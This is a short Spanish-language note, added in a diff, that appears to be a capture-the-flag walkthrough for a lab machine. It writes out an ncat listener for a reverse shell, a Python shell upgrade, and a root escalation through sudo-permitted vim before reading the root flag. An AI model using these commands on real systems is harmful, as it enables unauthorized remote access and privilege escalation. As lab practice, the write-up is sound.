@@ -1,0 +1,10 @@
+Estos pasos son usando windows
+ncat -lvnp 9001 --> Aqui me saldra la terminal de adrian en 2 minutos
+
+Dentro de la terminal de adrian (usando windows)
+adrian# python3 -c 'import pty;pty.spawn("/bin/bash")' -->Hacemos la terminal usable
+adrian# sudo -l -->(Debería decir: (root) NOPASSWD: /usr/bin/vim).
+adrian# sudo vim -c ':!/bin/sh' --> Con esto deberiamos conseguir permisos root
+
+Ahora ya estamos dentro de root
+root# cat /root/root.txt --> Obtenemos la flag
